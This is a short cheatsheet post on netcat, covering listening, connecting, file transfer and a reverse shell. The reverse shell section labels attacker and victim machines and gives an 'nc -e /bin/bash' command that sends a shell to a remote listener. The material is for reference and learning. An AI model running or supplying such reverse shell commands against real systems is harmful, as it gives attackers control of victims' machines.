---
layout: post
title: netcat
date: 2022-08-20
categories: [Cheatsheet,Common]
tags: [netcat]
---

# netcat
Netcat is a tool that reads and writes data across network connections, using TCP or UDP protocol. More information [Link](https://blog.ikuamike.io/posts/2021/netcat/)

## Server Mode
Use netcat to listen for connections. What this does is open a port (either tcp or udp) on the system. By default netcat listens on tcp.

> Basic Listener
```bash
$ nc -lvnp PORT
```
[-l]: Listen incoming connection
[-v]: Verbose output
[-n]: Do not do DNS
[-p]: Specifies source port nc should use

To listen on UDP must use `-u`.

## Client Mode
Use netcat to connect to an open port on a system. This can be beneficial for manually checking service banners or just checking if the port is open.

> Basic Connection
```bash
$ nc -vn @IP PORT
```

For a UDP connection we only add the `-u` option.

## File Transfer
Transfer files over the connection from one system to another without distortion.

> Listener
```bash
nc -lp PORT > /path/to/outfile 
```

> Client
```bash
$ nc -w3 @Listener_IP PORT < /path/to/infile
```
[-w]: Define the timeout in seconds.


## Reverse Shell
Use netcat in server mode to listen for connections then supply the shell from the client. This will allow the session on the server to run commands on the client once the shell is received.

> Server (Attacker Machine)
```bash
$ nc -lvnp 8080
```

> Client (Victim Machine)
```bash
$ nc -e /bin/bash @Server_IP PORT
```
[-e]: Execute external program after accepting a connection or making connection.
